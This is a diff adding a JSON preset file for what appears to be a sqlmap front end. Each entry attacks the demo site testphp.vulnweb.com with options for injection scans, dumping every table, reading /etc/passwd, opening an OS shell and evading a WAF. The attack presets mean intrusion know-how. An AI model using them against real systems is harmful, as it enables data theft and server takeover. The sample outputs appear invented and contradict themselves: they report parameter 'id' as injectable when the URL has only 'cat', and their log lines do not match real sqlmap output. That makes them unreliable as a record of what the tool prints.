@@ -1,0 +1,88 @@
+[
+    {
+        "name": "Basic Scan",
+        "description": "Perform a basic vulnerability scan on a target URL.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "level_select": "1",
+            "risk_select": "1"
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m testing connection to the target URL\n...snip...\n\u001b[1m\u001b[33m[WARNING]\u001b[0m all tested parameters appear to be not injectable. Try a higher level or risk.\n\u001b[1m\u001b[34m[INFO]\u001b[0m starting scan on 'id' parameter\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the parameter 'id' is injectable\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'"
+    },
+    {
+        "name": "Database Enumeration",
+        "description": "Enumerate databases on the target server.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "database_var": true
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m fetched a list of databases:\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'\n  \u001b[1m\u001b[36m+---\u001b[0m\n\u001b[1m\u001b[32m|\u001b[0m acuart\n\u001b[1m\u001b[32m|\u001b[0m information_schema\n  \u001b[1m\u001b[36m+---\u001b[0m\n\u001b[1m\u001b[34m[INFO]\u001b[0m all databases are listed"
+    },
+    {
+        "name": "Dump Columns & Data",
+        "description": "Dump columns from a specific table on the target. (Requires --dump)",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "dump_all_var": true,
+            "level_select": "5",
+            "risk_select": "3"
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m fetched database tables:\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'\n\u001b[1m\u001b[34m[INFO]\u001b[0m dumping all tables and columns\n\u001b[1m\u001b[34m[INFO]\u001b[0m dumping table 'users' in 'acuart' database\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m dumping completed\n\u001b[1m\u001b[34m[INFO]\u001b[0m all data are listed"
+    },
+    {
+        "name": "Read Local File",
+        "description": "Read a file from the server's file system using a file read vulnerability.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "file_read_entry": "/etc/passwd"
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m retrieved file content:\n\u001b[32mroot\u001b[0m:x:0:0:root:/root:/bin/bash\n\u001b[32mdaemon\u001b[0m:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\u001b[32mbin\u001b[0m:x:2:2:bin:/bin:/usr/sbin/nologin\n...snip...\n\u001b[1m\u001b[34m[INFO]\u001b[0m file reading completed"
+    },
+    {
+        "name": "Interactive OS Shell",
+        "description": "Obtain an interactive OS shell on the target server.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "os_shell_var": true
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the back-end DBMS is MySQL\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieving the operating system of the back-end DBMS\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the back-end DBMS operating system is Linux\n\u001b[1m\u001b[34m[INFO]\u001b[0m spawning OS shell on the target server...\n\n\u001b[1m\u001b[36msqlmap>\u001b[0m id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\u001b[1m\u001b[36msqlmap>\u001b[0m ls -l\ntotal 12\n-rw-r--r-- 1 www-data www-data  80 Jun 25  2014 index.php\n-rw-r--r-- 1 www-data www-data  40 Jun 25  2014 README.txt\n\u001b[1m\u001b[36msqlmap>\u001b[0m "
+    },
+    {
+        "name": "Union Query Attack",
+        "description": "Use the UNION query technique to extract data from a known table.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "union_query_var": true,
+            "tables_var": true
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking for UNION query SQL injection\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the parameter 'cat' is injectable with UNION query\n\u001b[1m\u001b[34m[INFO]\u001b[0m fetching tables for database 'acuart'\n\u001b[1m\u001b[34m[INFO]\u001b[0m the following tables were fetched:\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'\n  \u001b[1m\u001b[36m+---\u001b[0m\n\u001b[1m\u001b[32m|\u001b[0m users\n\u001b[1m\u001b[32m|\u001b[0m products\n\u001b[1m\u001b[32m|\u001b[0m categories\n  \u001b[1m\u001b[36m+---\u001b[0m\n\u001b[1m\u001b[34m[INFO]\u001b[0m fetched 3 tables"
+    },
+    {
+        "name": "Check for DBA Privileges",
+        "description": "Check if the current user is a database administrator.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "is_dba_var": true
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if current user is DBA\n...snip...\n\u001b[1m\u001b[31m[CRITICAL]\u001b[0m current user is not a DBA\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'"
+    },
+    {
+        "name": "Tamper Script Evasion",
+        "description": "Use a tamper script to evade a basic WAF.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "tamper_entry": "space2comment.py"
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m using tamper script 'space2comment.py'\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the parameter 'id' is injectable\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'"
+    },
+    {
+        "name": "Aggressive Scan",
+        "description": "Perform a comprehensive scan using a high level and risk.",
+        "options": {
+            "url_entry": "http://testphp.vulnweb.com/listproducts.php?cat=1",
+            "level_select": "5",
+            "risk_select": "3"
+        },
+        "example_output": "\u001b[1m\u001b[34m[INFO]\u001b[0m starting sqlmap 1.6\n\u001b[1m\u001b[34m[INFO]\u001b[0m running a comprehensive scan at Level 5 and Risk 3\n\u001b[1m\u001b[34m[INFO]\u001b[0m checking if the target is injectable\n...snip...\n\u001b[1m\u001b[32m[SUCCESS]\u001b[0m the parameter 'cat' is injectable\n\u001b[1m\u001b[34m[INFO]\u001b[0m fetched database banner: '5.0.12-dev' (MySQL)\n\u001b[1m\u001b[34m[INFO]\u001b[0m retrieved connection to 'http://testphp.vulnweb.com/listproducts.php?cat=1'"
+    }
+]
